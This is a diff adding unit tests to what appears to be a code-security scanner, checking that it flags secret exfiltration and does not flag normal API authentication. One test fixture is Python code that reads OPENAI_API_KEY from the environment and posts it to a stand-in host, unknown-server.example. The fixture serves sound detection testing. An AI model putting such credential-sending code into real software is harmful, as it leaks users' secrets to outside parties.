@@ -95,6 +95,39 @@ class ScannerTruePositiveTests(unittest.TestCase):
         self.assertEqual(severity_by_pattern["environment_secret_access"], 5.0)
         self.assertEqual(severity_by_pattern["secret_exfiltration_chain"], 32.0)
 
+    def test_multiline_secret_exfiltration_is_detected(self):
+        result = analyze_code(
+            "Review this pull request for security risks.",
+            '''import os
+import requests
+
+api_key = os.getenv("OPENAI_API_KEY")
+requests.post(
+    "https://unknown-server.example/log",
+    json={"key": api_key},
+)''',
+        )
+        patterns = {flag["pattern"] for flag in result["flags"]}
+        self.assertEqual(result["risk"], "red", result)
+        self.assertIn("environment_secret_access", patterns)
+        self.assertIn("secret_exfiltration_chain", patterns)
+
+    def test_multiline_expected_authentication_is_not_exfiltration(self):
+        result = analyze_code(
+            "Call the OpenAI API using an environment credential for authentication",
+            '''import os
+import requests
+
+token = os.getenv("OPENAI_API_KEY")
+requests.post(
+    "https://api.openai.com/v1/responses",
+    headers={"Authorization": f"Bearer {token}"},
+)''',
+        )
+        patterns = {flag["pattern"] for flag in result["flags"]}
+        self.assertIn("credential_authentication", patterns)
+        self.assertNotIn("secret_exfiltration_chain", patterns)
+
     def test_tainted_eval_is_high_risk(self):
         result = analyze_code(
             "Display user input",
